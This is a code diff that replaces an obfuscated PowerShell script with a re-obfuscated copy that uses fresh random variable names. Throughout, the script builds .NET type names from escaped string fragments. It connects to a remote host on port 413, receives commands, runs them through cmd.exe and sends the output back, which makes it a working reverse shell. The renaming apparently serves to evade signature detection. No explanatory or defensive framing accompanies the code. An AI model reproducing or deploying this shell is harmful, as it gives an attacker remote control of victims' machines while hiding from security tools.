@@ -1,211 +1,210 @@
-
-          $mddJLxew99 = "`g"
-   $xJtZNtfM99 = "n"
-          $FLZBJCWK99 = "`i"
-        $JMRZdzgi99 = "r"
-               $BvbRfaky99 = "t"
-          $ytjnHSWg99 = "`S"
-     $lAGGhMqu99 = "t"
-    $TQWLrown99 = "e"
-       $avLyBLPn99 = "`G"
-                  $eEvVTbxa99 = "`s"
-                $qNZxntqk99 = "s"
-        $XIVXzYcl99 = "e"
-          $BUVyRxni99 = "`c"
-    $OrxMqKdz99 = "o"
-             $PQgiHstU99 = "r"
-             $huKdBhYH99 = "P"
-       $aUGnvYiw99 = "."
-         $RhGqbXpX99 = "s"
-       $HBSUWCCZ99 = "c"
-           $IRnpuiso99 = "i"
-          $UFLkVbso99 = "t"
-      $JNqCVamL99 = "`s"
-   $FQwqDCXw99 = "`o"
-           $vekCIyVz99 = "n"
-              $SlWrYNwx99 = "`g"
-          $sylSeTzA99 = "a"
-         $VkhRTFUc99 = "`i"
-        $NRVbSXQI99 = "`D"
-              $KZpmFKrx99 = "`."
-        $EeTxYcXn99 = "`m"
-       $YpwDXNii99 = "e"
-              $zLyaJAaB99 = "t"
-      $rcEwtnZu99 = "`s"
-       $HUJePlKi99 = "`y"
-        $wuIrshcC99 = "`S"
-      $ZaKQdeHd99 = "o"
-                 $vXzbUrUj99 = "f"
-        $XnRVkfWD99 = "n"
-           $HwvbHGdZ99 = "I"
-      $umfpBDff99 = "t"
-      $IFglXiXc99 = "r"
-            $WgPRqlrx99 = "a"
-      $ZozFuJbT99 = "t"
-           $qMFeDfFP99 = "`S"
-                $eSGvqqJi99 = "s"
-     $bSlhHMfZ99 = "`s"
-     $iVFobplC99 = "e"
-        $MXulkEdl99 = "`c"
-        $lIWkUtEU99 = "o"
-         $lqOLuiVw99 = "r"
-           $AQzQCKGP99 = "P"
-          $xSSaJzZn99 = "."
-    $eoAKIbMp99 = "`s"
-              $vLPBbrWH99 = "`c"
-          $VrgpwbTE99 = "`i"
-               $bKMIbbnU99 = "t"
-               $bYZfkEQY99 = "`s"
-         $AqGRbPbt99 = "`o"
-          $EUoMcLuV99 = "n"
-    $vCjfqxqA99 = "g"
-                 $PYnofJGg99 = "a"
-           $mfDXrmId99 = "`i"
-              $zYmDLJfs99 = "`D"
-               $HKXURDfY99 = "`."
-               $BDqUCbZm99 = "m"
-      $qIXEDlUX99 = "e"
-       $iCDSzsaY99 = "t"
-            $sQENglZm99 = "`s"
-        $CRJXSaFs99 = "`y"
-        $ETNzEtWe99 = "`S"
-          $aAuUnsNw99 = "`g"
-       $NqBxEKqQ99 = "n"
-            $sVWLkXZU99 = "`i"
-        $XwNOJUXw99 = "`d"
-           $jbLyNtyX99 = "o"
-         $jopolkcv99 = "`c"
-    $IrvEdMGH99 = "n"
-                  $AcFMMSxH99 = "`E"
-            $fjyAYJOl99 = "`i"
-          $cYDwfRTz99 = "i"
-         $eZPzQZHn99 = "`c"
-   $CoZsHujm99 = "`s"
-         $aqgRYbKE99 = "`A"
-                  $wJiSVLvm99 = "."
-        $itpHstmU99 = "t"
-            $twAYsifj99 = "x"
-     $lrDOHinV99 = "e"
-      $ZpwLnMeh99 = "T"
-           $XNkgHMsr99 = "`."
-           $mpvoEHiG99 = "`m"
-      $VTQVtIXj99 = "e"
-                       $zdjowqKR99 = "t"
-       $lftpFyCz99 = "`s"
-      $JQFTCJJd99 = "`y"
-               $EDRxBUmZ99 = "`S"
-        $eyXtAgFv99 = "e"
-        $dbNZfdtr99 = "t"
-             $swhBtpkX99 = "`y"
-       $aVndQyVJ99 = "`B"
-            $ACsmbKDW99 = "`."
-             $bMaOFpsO99 = "m"
-                   $ZQZURXII99 = "e"
-          $MJQJIXza99 = "t"
-       $KyjcgZXd99 = "`s"
-       $BsZCIyBW99 = "`y"
-           $dDtdlOvg99 = "`S"
-            $EKeGhtGw99 = "r"
-       $rcDQfFKN99 = "e"
-      $qeaYnoZb99 = "t"
-           $ekFDooaR99 = "`i"
-            $kOBZQpwY99 = "r"
-        $RVTkfmjm99 = "`W"
-           $wUYxLwnb99 = "`m"
-         $ydoqKByE99 = "a"
-           $dazpmnSs99 = "e"
-          $pMWljcRl99 = "r"
-                  $OTprvCqR99 = "t"
-         $TfZvbwLU99 = "`S"
-           $nsEZuibZ99 = "`."
-            $TyIBGAfG99 = "`O"
-       $twURGREz99 = "I"
-          $oiHQqCaI99 = "."
-           $HZJPEQsr99 = "`m"
-             $xuQZScts99 = "e"
-   $FrbdsryZ99 = "t"
-     $dhyBpEXn99 = "s"
-            $XlBcXsBS99 = "`y"
-         $AAkCTwLH99 = "`S"
-      $tHTmRtWl99 = "t"
-    $fbFyBRNb99 = "n"
-          $fGRvUqnn99 = "e"
-      $jmaWnxuM99 = "i"
-         $MmrdvOHe99 = "l"
-     $GXaljvKF99 = "`C"
-       $NaINPuKc99 = "`p"
-         $LovCLoka99 = "c"
-               $AlhPIajN99 = "`T"
-        $jNdcxVnN99 = "."
-          $OVGuUGMs99 = "`s"
-             $RDcXWteW99 = "t"
-             $aVDcyXiL99 = "e"
-            $jefzZTRC99 = "k"
-       $RvjYeWnI99 = "c"
-              $MaONGbhD99 = "`o"
-          $JGDdxPdV99 = "S"
-         $EbFjsutZ99 = "."
-   $LxRHfHvn99 = "t"
-                    $kRTrmdQe99 = "e"
-               $TwKYDqNs99 = "`N"
-        $oeOJqYwU99 = "`."
-       $EnvKnqjd99 = "`m"
-                 $IYpzKful99 = "e"
-   $nyXmqZmk99 = "t"
-          $bmcwQZGu99 = "`s"
-               $WeCDLNXD99 = "y"
-               $MSXdhyMH99 = "`S"
-               $DiqYaPrK99 = new-object $MSXdhyMH99$WeCDLNXD99$bmcwQZGu99$nyXmqZmk99$IYpzKful99$EnvKnqjd99$oeOJqYwU99$TwKYDqNs99$kRTrmdQe99$LxRHfHvn99$EbFjsutZ99$JGDdxPdV99$MaONGbhD99$RvjYeWnI99$jefzZTRC99$aVDcyXiL99$RDcXWteW99$OVGuUGMs99$jNdcxVnN99$AlhPIajN99$LovCLoka99$NaINPuKc99$GXaljvKF99$MmrdvOHe99$jmaWnxuM99$fGRvUqnn99$fbFyBRNb99$tHTmRtWl99('0xAC12FFFF', 413);
-      if($DiqYaPrK99 -eq $null){exit 1}
-        $AdSViLrL99 = $DiqYaPrK99.GetStream();
-            $WVkDXydY99 = new-object $AAkCTwLH99$XlBcXsBS99$dhyBpEXn99$FrbdsryZ99$xuQZScts99$HZJPEQsr99$oiHQqCaI99$twURGREz99$TyIBGAfG99$nsEZuibZ99$TfZvbwLU99$OTprvCqR99$pMWljcRl99$dazpmnSs99$ydoqKByE99$wUYxLwnb99$RVTkfmjm99$kOBZQpwY99$ekFDooaR99$qeaYnoZb99$rcDQfFKN99$EKeGhtGw99($AdSViLrL99);
-              $jIhKIpZV99 = new-object $dDtdlOvg99$BsZCIyBW99$KyjcgZXd99$MJQJIXza99$ZQZURXII99$bMaOFpsO99$ACsmbKDW99$aVndQyVJ99$swhBtpkX99$dbNZfdtr99$eyXtAgFv99[] 1024;
-       $yBTLnPcT99 = new-object $EDRxBUmZ99$JQFTCJJd99$lftpFyCz99$zdjowqKR99$VTQVtIXj99$mpvoEHiG99$XNkgHMsr99$ZpwLnMeh99$lrDOHinV99$twAYsifj99$itpHstmU99$wJiSVLvm99$aqgRYbKE99$CoZsHujm99$eZPzQZHn99$cYDwfRTz99$fjyAYJOl99$AcFMMSxH99$IrvEdMGH99$jopolkcv99$jbLyNtyX99$XwNOJUXw99$sVWLkXZU99$NqBxEKqQ99$aAuUnsNw99;
-            do
-               {
-                $WVkDXydY99.Flush();
-        $read = $null;
-                        $iFOrUCEb99 = ""
-        while($AdSViLrL99.DataAvailable -or $read -eq $null) {
-                        $read = $AdSViLrL99.Read($jIhKIpZV99, 0, 1024)
-                        }
-                $hzdujJIm99 = $yBTLnPcT99."$avLyBLPn99$TQWLrown99$lAGGhMqu99$ytjnHSWg99$BvbRfaky99$JMRZdzgi99$FLZBJCWK99$xJtZNtfM99$mddJLxew99"($jIhKIpZV99, 0, $read).Replace("`r`n","").Replace("`n","");
-                if(!$hzdujJIm99.equals("exit")){
-                        $args = "";
-                if($hzdujJIm99.IndexOf(' ') -gt -1){
-                        $args = $hzdujJIm99.substring($hzdujJIm99.IndexOf(' ')+1);
-                                $hzdujJIm99 = $hzdujJIm99.substring(0,$hzdujJIm99.IndexOf(' '));
+       $yJuGIdXW99 = "`g"
+     $XnkjfWdK99 = "n"
+                       $GobtRQSQ99 = "`i"
+          $psuemKeC99 = "r"
+         $bEAQynLN99 = "t"
+        $kbmNGEjm99 = "`S"
+           $suURZMiv99 = "t"
+      $dPsgqDLd99 = "e"
+          $QGMuszFV99 = "`G"
+           $bpdkKyzN99 = "`s"
+           $CUBvNoaK99 = "`s"
+       $lUPOLxNV99 = "e"
+                     $vKajbvnI99 = "c"
+            $SMQgYQpQ99 = "`o"
+           $jDptkQtz99 = "r"
+             $jpXSLdRt99 = "`P"
+        $sKHqZdaB99 = "`."
+       $PjbXtBav99 = "s"
+           $TEBhSErh99 = "`c"
+       $KpUtRufy99 = "`i"
+        $EkQEaHcs99 = "t"
+           $REvjZHJD99 = "`s"
+     $RoWcETDW99 = "`o"
+      $fXRdgzkw99 = "n"
+            $teRwnhPQ99 = "`g"
+               $wmjUuEor99 = "a"
+         $NpgmdyGW99 = "`i"
+     $grTIdZqO99 = "`D"
+        $vsagaqhY99 = "`."
+              $OCvEQAyB99 = "`m"
+             $lbUDTocM99 = "e"
+              $LuUkXixG99 = "t"
+      $tCcKDSDp99 = "`s"
+       $zsmvEZqa99 = "`y"
+           $MNMXaBoR99 = "`S"
+       $boRPfZxt99 = "`o"
+        $JtPpOvOa99 = "f"
+                 $USeqkoAt99 = "n"
+           $mnlPSWty99 = "I"
+               $echTbtPk99 = "t"
+    $YQMTRCUw99 = "r"
+        $NiouzlZd99 = "a"
+   $xDeRYvLV99 = "t"
+         $nCIkOzZT99 = "S"
+       $HgenWxWc99 = "`s"
+    $BIxQYVnh99 = "`s"
+            $QRvORWzJ99 = "e"
+             $SKhtObtr99 = "`c"
+      $ydQMJGNh99 = "`o"
+    $kHVbTYxM99 = "r"
+        $vdNzzqxR99 = "P"
+    $ueJRxQCH99 = "`."
+             $WtMXsQIv99 = "`s"
+              $IVGsXlCi99 = "`c"
+          $eoPcqbvC99 = "`i"
+       $SvIIiRzi99 = "t"
+        $YLZYjhQW99 = "`s"
+                    $ZRITPaqD99 = "`o"
+     $sbFlUxXr99 = "n"
+           $SqAdoCKe99 = "`g"
+           $IyCYvBfg99 = "a"
+             $fDFqAOmk99 = "`i"
+       $sweQzdGV99 = "`D"
+           $UsIZgCGC99 = "."
+        $LecpyCdk99 = "`m"
+          $YBeuOUVC99 = "e"
+            $IpbFZcfC99 = "t"
+      $HwtEGCNI99 = "s"
+     $yXlHWrlj99 = "`y"
+                $jMLyUJiJ99 = "`S"
+              $qauwbYFA99 = "`g"
+              $yDJGsiUc99 = "n"
+          $WSCdRbwn99 = "`i"
+           $AwXWmDaU99 = "d"
+             $eSJvwvgn99 = "`o"
+      $xiZCjJQp99 = "c"
+               $YVfcLWOG99 = "n"
+             $cXxeJigN99 = "`E"
+          $yTpQOtIv99 = "i"
+            $OPHQgJRj99 = "i"
+       $vOTejljh99 = "c"
+     $aAepyArn99 = "`s"
+      $YglDBLog99 = "A"
+     $PGBptpiy99 = "`."
+             $FGCcRMGn99 = "t"
+              $ECuEawvy99 = "x"
+          $VbtrhcDj99 = "e"
+            $hSaUfxfF99 = "T"
+                 $WYdDzYhw99 = "."
+      $kaXjhSfC99 = "m"
+          $VuqXGVBT99 = "e"
+              $uShrTBBE99 = "t"
+       $jfRYHHzE99 = "s"
+           $yBHlZbbR99 = "`y"
+   $RijSEMkW99 = "S"
+        $dxvCihaz99 = "e"
+         $fIXEGoBn99 = "t"
+             $aXDEbbZr99 = "y"
+        $NtVUyTPm99 = "`B"
+        $TDRwxfPx99 = "`."
+        $TYkEsvvq99 = "`m"
+       $VrtxZGVa99 = "e"
+                $LNqnvYtu99 = "t"
+       $RsebVCly99 = "s"
+          $rVOODteg99 = "y"
+          $IBPqcBIO99 = "`S"
+           $AQFWhoPX99 = "r"
+            $AtYzbbPE99 = "e"
+      $iErFoklM99 = "t"
+       $uSPjXwcU99 = "`i"
+    $QIqSmVZb99 = "r"
+      $tJClNRxO99 = "`W"
+           $coLuuYuN99 = "`m"
+             $dtUGZOST99 = "a"
+    $QNbTdQMH99 = "e"
+            $SNuBHKWU99 = "r"
+      $usIkFnJY99 = "t"
+              $UMfXyBZJ99 = "S"
+          $hzrgAWrg99 = "`."
+         $bigDXXHe99 = "`O"
+       $ZGhYGvGe99 = "I"
+         $muRzTRfT99 = "`."
+      $TdFmNvYY99 = "`m"
+       $IBFsRPqO99 = "e"
+         $EfqJCehR99 = "t"
+     $LdVgDmQw99 = "s"
+        $VgJfobLW99 = "`y"
+            $mvDIlwph99 = "`S"
+      $stBXXRtF99 = "t"
+            $JWRXHjdX99 = "n"
+       $feWThITU99 = "e"
+    $BVxZKnNn99 = "`i"
+    $CwNajlMg99 = "`l"
+           $qmEKdpVp99 = "`C"
+            $YuSYGvSB99 = "`p"
+        $rFlrWsHC99 = "c"
+                $HZuBPOPY99 = "`T"
+                      $ymqglaxJ99 = "`."
+          $OuNENCUZ99 = "`s"
+         $EMiplaYT99 = "t"
+                   $IQQodFxm99 = "e"
+       $UAsAoEQy99 = "`k"
+                  $mbqzXkvR99 = "`c"
+          $IPIRNqGk99 = "`o"
+                 $oWmjmrFb99 = "`S"
+     $kTdjZRxj99 = "."
+      $psKdENlo99 = "t"
+       $AHZNCLnD99 = "e"
+        $QieeAiXj99 = "`N"
+          $UugNJSMZ99 = "."
+      $teECWkKA99 = "`m"
+             $VHecMIYi99 = "e"
+      $cFMObHtZ99 = "t"
+              $PiwJBUyD99 = "`s"
+          $jPppUxJK99 = "`y"
+             $vOJRXGmw99 = "`S"
+           $mVhKELCw99 = new-object $vOJRXGmw99$jPppUxJK99$PiwJBUyD99$cFMObHtZ99$VHecMIYi99$teECWkKA99$UugNJSMZ99$QieeAiXj99$AHZNCLnD99$psKdENlo99$kTdjZRxj99$oWmjmrFb99$IPIRNqGk99$mbqzXkvR99$UAsAoEQy99$IQQodFxm99$EMiplaYT99$OuNENCUZ99$ymqglaxJ99$HZuBPOPY99$rFlrWsHC99$YuSYGvSB99$qmEKdpVp99$CwNajlMg99$BVxZKnNn99$feWThITU99$JWRXHjdX99$stBXXRtF99('0xAC12FFFF', 413);
+              if($mVhKELCw99 -eq $null){exit 1}
+     $kUquvjlr99 = $mVhKELCw99.GetStream();
+         $RpqabmbK99 = new-object $mvDIlwph99$VgJfobLW99$LdVgDmQw99$EfqJCehR99$IBFsRPqO99$TdFmNvYY99$muRzTRfT99$ZGhYGvGe99$bigDXXHe99$hzrgAWrg99$UMfXyBZJ99$usIkFnJY99$SNuBHKWU99$QNbTdQMH99$dtUGZOST99$coLuuYuN99$tJClNRxO99$QIqSmVZb99$uSPjXwcU99$iErFoklM99$AtYzbbPE99$AQFWhoPX99($kUquvjlr99);
+             $ADvxMkSS99 = new-object $IBPqcBIO99$rVOODteg99$RsebVCly99$LNqnvYtu99$VrtxZGVa99$TYkEsvvq99$TDRwxfPx99$NtVUyTPm99$aXDEbbZr99$fIXEGoBn99$dxvCihaz99[] 1024;
+       $hAteEVZl99 = new-object $RijSEMkW99$yBHlZbbR99$jfRYHHzE99$uShrTBBE99$VuqXGVBT99$kaXjhSfC99$WYdDzYhw99$hSaUfxfF99$VbtrhcDj99$ECuEawvy99$FGCcRMGn99$PGBptpiy99$YglDBLog99$aAepyArn99$vOTejljh99$OPHQgJRj99$yTpQOtIv99$cXxeJigN99$YVfcLWOG99$xiZCjJQp99$eSJvwvgn99$AwXWmDaU99$WSCdRbwn99$yDJGsiUc99$qauwbYFA99;
+        do
+            {
+                        $RpqabmbK99.Flush();
+                $read = $null;
+                $OJouZSoH99 = ""
+                while($kUquvjlr99.DataAvailable -or $read -eq $null) {
+                        $read = $kUquvjlr99.Read($ADvxMkSS99, 0, 1024)
+        }
+                        $bnHowkIz99 = $hAteEVZl99."$QGMuszFV99$dPsgqDLd99$suURZMiv99$kbmNGEjm99$bEAQynLN99$psuemKeC99$GobtRQSQ99$XnkjfWdK99$yJuGIdXW99"($ADvxMkSS99, 0, $read).Replace("`r`n","").Replace("`n","");
+                if(!$bnHowkIz99.equals("exit")){
+                $args = "";
+                        if($bnHowkIz99.IndexOf(' ') -gt -1){
+                                $args = $bnHowkIz99.substring($bnHowkIz99.IndexOf(' ')+1);
+                                $bnHowkIz99 = $bnHowkIz99.substring(0,$bnHowkIz99.IndexOf(' '));
                                 if($args.split(' ').length -gt 1){
-                      $JVVxBDvi99 = New-Object $ETNzEtWe99$CRJXSaFs99$sQENglZm99$iCDSzsaY99$qIXEDlUX99$BDqUCbZm99$HKXURDfY99$zYmDLJfs99$mfDXrmId99$PYnofJGg99$vCjfqxqA99$EUoMcLuV99$AqGRbPbt99$bYZfkEQY99$bKMIbbnU99$VrgpwbTE99$vLPBbrWH99$eoAKIbMp99$xSSaJzZn99$AQzQCKGP99$lqOLuiVw99$lIWkUtEU99$MXulkEdl99$iVFobplC99$bSlhHMfZ99$eSGvqqJi99$qMFeDfFP99$ZozFuJbT99$WgPRqlrx99$IFglXiXc99$umfpBDff99$HwvbHGdZ99$XnRVkfWD99$vXzbUrUj99$ZaKQdeHd99
-                          $JVVxBDvi99.FileName = "cmd.exe"
-                        $JVVxBDvi99.RedirectStandardError = $true
-                              $JVVxBDvi99.RedirectStandardOutput = $true
-                             $JVVxBDvi99.UseShellExecute = $false
-                                  $JVVxBDvi99.Arguments = "/c $hzdujJIm99 $args"
-                      $uAKnBqLa99 = New-Object $wuIrshcC99$HUJePlKi99$rcEwtnZu99$zLyaJAaB99$YpwDXNii99$EeTxYcXn99$KZpmFKrx99$NRVbSXQI99$VkhRTFUc99$sylSeTzA99$SlWrYNwx99$vekCIyVz99$FQwqDCXw99$JNqCVamL99$UFLkVbso99$IRnpuiso99$HBSUWCCZ99$RhGqbXpX99$aUGnvYiw99$huKdBhYH99$PQgiHstU99$OrxMqKdz99$BUVyRxni99$XIVXzYcl99$qNZxntqk99$eEvVTbxa99
-                        $uAKnBqLa99.StartInfo = $JVVxBDvi99
-                             $uAKnBqLa99.Start() | Out-Null
-                      $uAKnBqLa99.WaitForExit()
-                            $kXKaPlOs99 = $uAKnBqLa99.StandardOutput.ReadToEnd()
-                         $zXmKdusZ99 = $uAKnBqLa99.StandardError.ReadToEnd()
-                        if ($uAKnBqLa99.ExitCode -ne 0) {
-                                   $iFOrUCEb99 = $zXmKdusZ99
-                               } else {
-                                $iFOrUCEb99 = $kXKaPlOs99
-                   }
+                       $LvPGzrej99 = New-Object $jMLyUJiJ99$yXlHWrlj99$HwtEGCNI99$IpbFZcfC99$YBeuOUVC99$LecpyCdk99$UsIZgCGC99$sweQzdGV99$fDFqAOmk99$IyCYvBfg99$SqAdoCKe99$sbFlUxXr99$ZRITPaqD99$YLZYjhQW99$SvIIiRzi99$eoPcqbvC99$IVGsXlCi99$WtMXsQIv99$ueJRxQCH99$vdNzzqxR99$kHVbTYxM99$ydQMJGNh99$SKhtObtr99$QRvORWzJ99$BIxQYVnh99$HgenWxWc99$nCIkOzZT99$xDeRYvLV99$NiouzlZd99$YQMTRCUw99$echTbtPk99$mnlPSWty99$USeqkoAt99$JtPpOvOa99$boRPfZxt99
+                    $LvPGzrej99.FileName = "cmd.exe"
+                      $LvPGzrej99.RedirectStandardError = $true
+                         $LvPGzrej99.RedirectStandardOutput = $true
+                     $LvPGzrej99.UseShellExecute = $false
+                       $LvPGzrej99.Arguments = "/c $bnHowkIz99 $args"
+                           $VnCnfGiD99 = New-Object $MNMXaBoR99$zsmvEZqa99$tCcKDSDp99$LuUkXixG99$lbUDTocM99$OCvEQAyB99$vsagaqhY99$grTIdZqO99$NpgmdyGW99$wmjUuEor99$teRwnhPQ99$fXRdgzkw99$RoWcETDW99$REvjZHJD99$EkQEaHcs99$KpUtRufy99$TEBhSErh99$PjbXtBav99$sKHqZdaB99$jpXSLdRt99$jDptkQtz99$SMQgYQpQ99$vKajbvnI99$lUPOLxNV99$CUBvNoaK99$bpdkKyzN99
+                               $VnCnfGiD99.StartInfo = $LvPGzrej99
+                      $VnCnfGiD99.Start() | Out-Null
+                            $VnCnfGiD99.WaitForExit()
+                           $DwmSWPHQ99 = $VnCnfGiD99.StandardOutput.ReadToEnd()
+                        $mxUEsDKo99 = $VnCnfGiD99.StandardError.ReadToEnd()
+                             if ($VnCnfGiD99.ExitCode -ne 0) {
+                                $OJouZSoH99 = $mxUEsDKo99
+                      } else {
+                            $OJouZSoH99 = $DwmSWPHQ99
+                    }
+                                }
+                                        else{
+                                        $OJouZSoH99 = (&"$bnHowkIz99" "$args") | out-string;
+                        }
                         }
                                 else{
-                                        $iFOrUCEb99 = (&"$hzdujJIm99" "$args") | out-string;
-                                }
+                                $OJouZSoH99 = (&"$bnHowkIz99") | out-string;
                         }
-                        else{
-                        $iFOrUCEb99 = (&"$hzdujJIm99") | out-string;
-                        }
-                                if($iFOrUCEb99 -ne $null){
-             $WVkDXydY99.WriteLine($iFOrUCEb99)
+                        if($OJouZSoH99 -ne $null){
+             $RpqabmbK99.WriteLine($OJouZSoH99)
               }
                 }
-        }While (!$hzdujJIm99.equals("exit"))
-         $WVkDXydY99.close();
-       $DiqYaPrK99.close();
-           $AdSViLrL99.Dispose()
+      }While (!$bnHowkIz99.equals("exit"))
+          $RpqabmbK99.close();
+       $mVhKELCw99.close();
+    $kUquvjlr99.Dispose()
